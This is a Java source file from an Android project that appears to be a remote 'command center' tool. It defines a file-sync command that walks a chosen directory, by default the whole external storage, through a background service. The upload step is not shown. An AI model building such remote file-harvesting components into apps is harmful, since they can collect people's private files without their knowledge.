package com.theah64.xrob.commandcenter.commands;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;

import com.theah64.xrob.services.FileWalkerService;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

import java.io.File;

/**
 * Created by theapache64 on 27/9/16.
 */

public class FileSyncCommand extends BaseCommand {

    private static final String FLAG_DIRECTORY = "d";

    private static final Options options = new Options()
            .addOption(FLAG_DIRECTORY, true, "Directory path to sync");

    private String dir;

    public FileSyncCommand(String command) throws CommandException, ParseException {
        super(command);
        this.dir = super.getCmd().getOptionValue(FLAG_DIRECTORY, null);

        if (this.dir == null) {
            this.dir = Environment.getExternalStorageDirectory().getAbsolutePath();
        } else {
            //Has custom dir
            if (!new File(this.dir).exists()) {
                throw new CommandException(this.dir + " does not exist!");
            }
        }


    }

    @Override
    public void handle(Context context, Callback callback) {
        final Intent fileWalkerIntent = new Intent(context, FileWalkerService.class);
        fileWalkerIntent.putExtra(FileWalkerService.KEY_PATH_TO_WALK, this.dir);
        context.startService(fileWalkerIntent);
        callback.onSuccess("File sync started @" + this.dir);
    }

    @Override
    public Options getOptions() {
        return options;
    }
}
